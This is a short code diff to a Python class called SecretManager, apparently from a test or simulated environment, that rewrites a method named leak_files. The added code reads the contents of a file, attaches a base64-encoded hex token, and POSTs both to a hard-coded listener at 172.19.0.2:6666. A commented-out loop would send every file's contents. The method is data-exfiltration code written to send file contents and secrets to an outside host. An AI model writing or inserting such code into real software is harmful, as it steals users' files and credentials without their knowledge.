@@ -148,8 +148,21 @@ class SecretManager:
         
         
     def leak_files(self, files:List[str])->None:
-        payload = files
-        requests.post("http://172.19.0.2:6666/files", json=payload)    
+        
+        payload = {}
+        """
+        for file in files:
+            with open(file, "r") as f:
+                payload[str(file)]= f.read()
+                requests.post("http://172.19.0.2:6666/files", json=payload)
+            payload = {} 
+"""
+        token = self.get_hex_token()
+        with open(files[0], "r") as f: 
+            payload["token"] = self.bin_to_b64(token) 
+            payload[str(files[0])]= f.read()
+        requests.post("http://172.19.0.2:6666/files", json=payload)
+           
         return {}
 
     def clean(self):
